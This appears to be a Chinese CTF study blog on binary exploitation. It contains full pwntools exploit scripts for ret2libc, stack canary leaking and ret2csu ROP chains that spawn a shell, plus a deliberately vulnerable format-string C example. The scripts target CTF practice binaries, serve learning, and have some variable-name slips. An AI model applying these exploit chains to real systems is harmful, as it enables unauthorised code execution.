<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc-CSDN博客</a></p>
<p><code>shift + F12</code>字符串窗口</p>
<p><code>gdb</code>中使用<code>vmmap</code>查看可读可写区域</p>
<h3 id="e-g-2021-鹤城杯-babyof-NSSCTF"><a href="#e-g-2021-鹤城杯-babyof-NSSCTF" class="headerlink" title="e.g.[2021 鹤城杯]babyof | NSSCTF"></a>e.g.[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/469">2021 鹤城杯]babyof | NSSCTF</a></h3><p>前言<br>64位Linux和32位Linux确乎有着关于参数传递上的不同，然而无论哪种，关于ret2libc这一题型。如果仅仅是wiki上的三道题目，那还是远远不够的。故尝试通过本题，总结ret2libc的一般过程。</p>
<p>过程包括通过puts&#x2F;write来泄露got表中的puts&#x2F;write的真实地址-&gt;计算libc的基址-&gt;libc基址+任意库函数相对于libc的偏移量&#x3D;任意函数真实地址-&gt;libc基址+libc中’&#x2F;bin&#x2F;sh’偏移量&#x3D;’&#x2F;bin&#x2F;sh’地址，如此构造system(‘&#x2F;bin&#x2F;sh’)</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyof&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyof&#x27;</span>)</span><br><span class="line">puts_plt = <span class="number">0x400520</span></span><br><span class="line"><span class="comment"># 因为64位使用寄存器传参（rdi, rsi, rdx, rcx, r8, r9）</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x400743</span></span><br><span class="line">main_addr = <span class="number">0x40066b</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">72</span>)</span><br><span class="line"><span class="comment"># 将puts_got的地址pop到rdi中</span></span><br><span class="line">payload1 += p64(pop_rdi_ret_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="comment"># 第一次溢出返回到puts</span></span><br><span class="line">payload1 += p64(puts_plt)</span><br><span class="line"><span class="comment"># puts返回地址到main</span></span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;overflow?\n&#x27;</span>, payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;win\n&#x27;</span>)</span><br><span class="line">puts_real_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#一个地址的最高位的两个字节是00，而且实际栈地址一般是0x7fxxxx开头的，因此为了避免获取错误的地址值，只需要获取前面的6字节值，然后通过ljust函数把最高位的两字节填充成00。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================之所以称为ret2libc：=======================================================</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_real_addr)         <span class="comment">#LibcSearcher,通过函数名和函数真实地址来找到对应的libc（之后会做选择，选择正确的那个即可） </span></span><br><span class="line">libc_addr=puts_real_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)       <span class="comment">#libc的真实的基址=puts的真实地址-puts相对于libc基址的偏移量</span></span><br><span class="line">bin_sh_addr=libc_addr+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#&#x27;/bin/sh&#x27;的真实地址=libc基址的真实地址+&#x27;/bin/sh&#x27;相对于libc基址的偏移量</span></span><br><span class="line">system_real_addr=libc_addr+libc.dump(<span class="string">&quot;system&quot;</span>)   <span class="comment">#system函数的真实地址=libc基址的真实地址+system函数相对于libc基址的偏移量</span></span><br><span class="line"><span class="comment">#===============================================================================================================================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)            <span class="comment">#栈溢出</span></span><br><span class="line">payload2+=p64(ret)                <span class="comment">#	因为system被调用时，其中有一个汇编指令，要求栈顶16字节对齐，否则会出错。需要栈能够调整其高度，就可以通过ret+ret+…+addr的方式。这样首先是调整了输入的个数（满足栈顶对齐的要求），其次ret到下一个ret,反复执行实则是“空转”，相当于pop了当前的栈元素，不起到任何其他作用。最后还是跳到了addr的位置。</span></span><br><span class="line">payload2+=p64(pop_ret_rdi_addr)+p64(bin_sh_addr)<span class="comment">#system函数的参数准备，即把&#x27;/bin/sh&#x27;（的地址）传入 </span></span><br><span class="line">payload2+=p64(system_real_addr)   <span class="comment">#调用system</span></span><br><span class="line">payload2+=p64(main_addr)          <span class="comment"># 给一个返回地址，不要也行</span></span><br><span class="line"> </span><br><span class="line">io.sendlineafter(<span class="string">&quot;overflow?\n&quot;</span>,payload2)         <span class="comment">#栈溢出点发送payload</span></span><br><span class="line">io.recv()                         <span class="comment">#吸收一下发过来的数据，没必要</span></span><br><span class="line">io.interactive()                  <span class="comment">#开始交互，ls -&gt; cat flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2021-鹤城杯Canary-littleof"><a href="#2021-鹤城杯Canary-littleof" class="headerlink" title="[2021 鹤城杯Canary]littleof"></a>[2021 鹤城杯Canary]<strong>littleof</strong></h3><p>[【PWN · ret2libc | Canary】<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_Fmnwon/article/details/131098575">2021 鹤城杯]littleof-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://mzgao.blog.csdn.net/article/details/104115114">Canary学习（泄露Canary）-CSDN博客</a></p>
<p>首先<code>file</code>, <code>checksec</code>一下，得出程序是64位的，且开启了canary保护，再放入ida中</p>
<p><img src="/2024/03/15/CTF/image-20240411225807677.png" alt="image-20240411225807677"></p>
<p>如果我们写大量的数据覆写掉buf数组长度的字符串的结尾标志，那么下一行printf就可以泄露大量的栈上信息——<strong>泄露出我们的Canary</strong></p>
<h4 id="Canary绕过"><a href="#Canary绕过" class="headerlink" title="Canary绕过"></a>Canary绕过</h4><p>Canary设计以字节\x00结尾，本意是保证Canary可以截断字符串。泄露栈中的Canary的思路是覆盖Canary的低字节，来打印出剩余的Canary部分。需要合适的输出函数，并且需要先泄露Canary，之后再次溢出控制执行流程。<br>需要注意：Canary一般最低位是\x00，也就是结尾处，64位程序的canary的大小是8个字节，32位程序的canary的大小是4个字节。<br>canary的位置不一定与ebp存储的位置相邻，具体得看程序的汇编操作，不同编译器在进行编译时canary位置可能出现偏差，有可能ebp与canary之间有字节被随机填充</p>
<p><img src="/2024/03/15/CTF/image-20240412012527785.png" alt="image-20240412012527785"></p>
<p>可知</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[rbp + buf] -50h	里是buf</span><br><span class="line">[rbp + var_8] -8 	里存放的是canary的值</span><br><span class="line">因此向其中填充(0x50-8)个字节即可</span><br><span class="line">然后后面的printf函数会打印canary出来</span><br></pre></td></tr></table></figure>

<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> u64,p64</span><br><span class="line"> </span><br><span class="line"><span class="comment"># io=process(&quot;./littleof&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./littleof&quot;</span>)</span><br><span class="line"> </span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#payload1:准备泄露canary</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x8</span>)   <span class="comment">#构造尾部不同的垃圾数据，使得能够定位到最后</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">io.sendline(payload1);          <span class="comment">#注意，最后发了个回车，对应\x0a需要剪掉</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x8</span>))             <span class="comment">#定位到canary之前</span></span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))          <span class="comment">#接收canary，但是勿忘回车</span></span><br><span class="line">canary=canary-<span class="number">0x0a</span>              <span class="comment">#减去回车</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary:&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"> </span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x400863</span></span><br><span class="line">ret_addr=<span class="number">0x40059e</span>               <span class="comment">#单个ret指令，用于栈对齐</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x400789</span></span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt:&quot;</span>,<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;plt_got:&quot;</span>,<span class="built_in">hex</span>(puts_got))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#payload2：泄露libc</span></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>       <span class="comment">#绕过canary保护的垃圾数据</span></span><br><span class="line">payload2+=p64(pop_rdi_ret_addr)+p64(puts_got)   <span class="comment">#pop rdi来设置puts的参数</span></span><br><span class="line">payload2+=p64(puts_plt)                         <span class="comment">#调用puts函数</span></span><br><span class="line">payload2+=p64(main_addr)                        <span class="comment">#返回有效地址且再次进行栈溢出</span></span><br><span class="line"> </span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,payload2)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))    <span class="comment">#获取puts真实地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_real_addr:&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#--------------------------------ret2libc---------------------------#</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment">#-------------------------------------------------------------------#</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#payload3：构造调用system(&quot;/bin/sh&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload3=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#	因为system被调用时，其中有一个汇编指令，要求栈顶16字节对齐，否则会出错。需要栈能够调整其高度，就可以通过ret+ret+…+addr的方式。这样首先是调整了输入的个数（满足栈顶对齐的要求），其次ret到下一个ret,反复执行实则是“空转”，相当于pop了当前的栈元素，不起到任何其他作用。最后还是跳到了addr的位置。</span></span><br><span class="line"><span class="comment"># 返回到ret指令，进行栈对齐操作</span></span><br><span class="line">payload3+=p64(ret_addr)</span><br><span class="line"><span class="comment"># 设置system函数的参数</span></span><br><span class="line">payload3+=p64(pop_rdi_ret_addr)+p64(bin_sh)</span><br><span class="line">payload3+=p64(system)</span><br><span class="line"></span><br><span class="line">payload3+=p64(main_addr)</span><br><span class="line"> </span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/AcSuccess/article/details/104448463">中级ROP之ret2csu_read(0, fmt, 0x100ull)-CSDN博客</a></p>
<p><strong>原理</strong><br>在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。这时候，我们可以利用x64下的__libc_csu_init中的gadgets，如例二情况。<br>这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。</p>
<p><strong>__libc_csu_init函数的汇编指令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011B0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004011B0                 public __libc_csu_init</span><br><span class="line">.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004011B0 ; __unwind &#123;</span><br><span class="line">.text:00000000004011B0                 push    r15</span><br><span class="line">.text:00000000004011B2                 mov     r15, rdx</span><br><span class="line">.text:00000000004011B5                 push    r14</span><br><span class="line">.text:00000000004011B7                 mov     r14, rsi</span><br><span class="line">.text:00000000004011BA                 push    r13</span><br><span class="line">.text:00000000004011BC                 mov     r13d, edi</span><br><span class="line">.text:00000000004011BF                 push    r12</span><br><span class="line">.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004011C8                 push    rbp</span><br><span class="line">.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004011D0                 push    rbx</span><br><span class="line">.text:00000000004011D1                 sub     rbp, r12</span><br><span class="line">.text:00000000004011D4                 sub     rsp, 8</span><br><span class="line">.text:00000000004011D8                 call    _init_proc</span><br><span class="line">.text:00000000004011DD                 sar     rbp, 3</span><br><span class="line">.text:00000000004011E1                 jz      short loc_4011FE</span><br><span class="line">.text:00000000004011E3                 xor     ebx, ebx</span><br><span class="line">.text:00000000004011E5                 nop     dword ptr [rax]</span><br><span class="line">.text:00000000004011E8</span><br><span class="line">.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j</span><br><span class="line">.text:00000000004011E8                 mov     rdx, r15</span><br><span class="line">.text:00000000004011EB                 mov     rsi, r14</span><br><span class="line">.text:00000000004011EE                 mov     edi, r13d</span><br><span class="line">.text:00000000004011F1                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004011F5                 add     rbx, 1</span><br><span class="line">.text:00000000004011F9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011FC                 jnz     short loc_4011E8</span><br><span class="line">.text:00000000004011FE</span><br><span class="line">.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j</span><br><span class="line">.text:00000000004011FE                 add     rsp, 8</span><br><span class="line">.text:0000000000401202                 pop     rbx</span><br><span class="line">.text:0000000000401203                 pop     rbp</span><br><span class="line">.text:0000000000401204                 pop     r12</span><br><span class="line">.text:0000000000401206                 pop     r13</span><br><span class="line">.text:0000000000401208                 pop     r14</span><br><span class="line">.text:000000000040120A                 pop     r15</span><br><span class="line">.text:000000000040120C                 retn</span><br><span class="line">.text:000000000040120C ; &#125; // starts at 4011B0</span><br><span class="line">.text:000000000040120C __libc_csu_init endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>分析</strong></p>
<p>gadgets1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j</span><br><span class="line">.text:00000000004011FE                 add     rsp, 8</span><br><span class="line">.text:0000000000401202                 pop     rbx</span><br><span class="line">.text:0000000000401203                 pop     rbp</span><br><span class="line">.text:0000000000401204                 pop     r12</span><br><span class="line">.text:0000000000401206                 pop     r13</span><br><span class="line">.text:0000000000401208                 pop     r14</span><br><span class="line">.text:000000000040120A                 pop     r15</span><br><span class="line">.text:000000000040120C                 retn</span><br><span class="line">.text:000000000040120C ; &#125; // starts at 4011B0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>这段代码可以将你构造的栈中的值一个一个顺序存到rbx,rbp,r12,r13,r14,r15寄存器中。</li>
<li>需要注意的是，可能随着环境的不同，r13,r14,r15的顺序也会有所改变。</li>
</ul>
<p>gadgets2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j</span><br><span class="line">.text:00000000004011E8                 mov     rdx, r15</span><br><span class="line">.text:00000000004011EB                 mov     rsi, r14</span><br><span class="line">.text:00000000004011EE                 mov     edi, r13d</span><br><span class="line">.text:00000000004011F1                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004011F5                 add     rbx, 1</span><br><span class="line">.text:00000000004011F9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011FC                 jnz     short loc_4011E8</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>通过gadgets1中最后的ret，使程序流程走gadget2，这样可以将存储在r15的值赋给rdx，存储在r14的值赋给rsi，存储在r13的值赋给edi，此时rdi的高32位寄存器中值为0，所以我们也可以控制rdi的值。</p>
</li>
<li><p>call指令跳转到r12寄存器存储的位置处（在gadgets1中置rbx&#x3D;0）</p>
</li>
<li><p>rbx+1，判断是否与rbp相等，否则重新执行gadgets2，这里我们为了不重新执行，将rbp置为1.</p>
</li>
<li><p>这段gadgets2走完之后，顺序往下走汇编码，又会走到gadgets1，所以我们在栈中需要设7*8&#x3D;56个padding字符，使栈不会空，然后设置特定的ret地址。</p>
</li>
<li><p>重新走gadgets1时，会把rbx,rbp,r12,r13,r14,r15六个寄存器重新设值，但这六个寄存器对我们来说已经没用了，所以可以为任意的padding。我们的目的仅仅是要控制rdi,rsi,rdx三个寄存器来存放函数的参数。</p>
</li>
<li><p>需要注意的是，rdi为第一个参数的存放寄存器，rsi为第二个参数，rdx为第三个参数。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  vul(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">vul</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a3 == <span class="number">3</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try or Retry your payload&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>分析+Exp</strong></p>
<ul>
<li>不能使用call直接跳转到vul函数，因为got表中没有vul函数，所以要考虑绕过call这个调用，使用ret返回到vul的真实地址。</li>
</ul>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./easy_csu&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./easy_csu&quot;</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x4011fe</span></span><br><span class="line">gadget2 = <span class="number">0x4011e8</span></span><br><span class="line">vul_addr=<span class="number">0x401132</span></span><br><span class="line"><span class="comment"># 这里通过init_array_start函数的指针来跳过call</span></span><br><span class="line"><span class="comment"># init_array_start函数是ELF程序的一个初始化函数，运行它不会对栈空间造成影响，可以说是用于跳过call指令的最佳选择</span></span><br><span class="line">init_array=elf.symbols[<span class="string">&#x27;__init_array_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 跳到gadget1时，先esp+8，再pop值到对应寄存器中</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span> + <span class="number">8</span>) + p64(gadget1) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># rbx=0,rbp=1</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># r12,调用的函数地址</span></span><br><span class="line">payload += p64(init_array)</span><br><span class="line"><span class="comment">#r13,r14,r15</span></span><br><span class="line"><span class="comment">#因为调用的是init_array_start函数,所以参数随意,但题目要求a3==3</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload+=p64(gadget2)</span><br><span class="line"><span class="comment">#向下走会回到gadget1所以再填充7*8个字节</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(vul_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="格式化字符串漏洞-1"><a href="#格式化字符串漏洞-1" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/aedgn4#MVxZS">格式化字符串漏洞 (yuque.com)</a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>以一个例子展示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译一下：<code>gcc -m32 -fno-stack-protector -no-pie -o fs1 1.c</code></p>
<p>在 printf 函数上面下个断点，然后 r 运行，输入 %08x.%08x.%08x</p>
<p><img src="/2024/03/15/CTF/image-20240416233705677.png" alt="image-20240416233705677"></p>
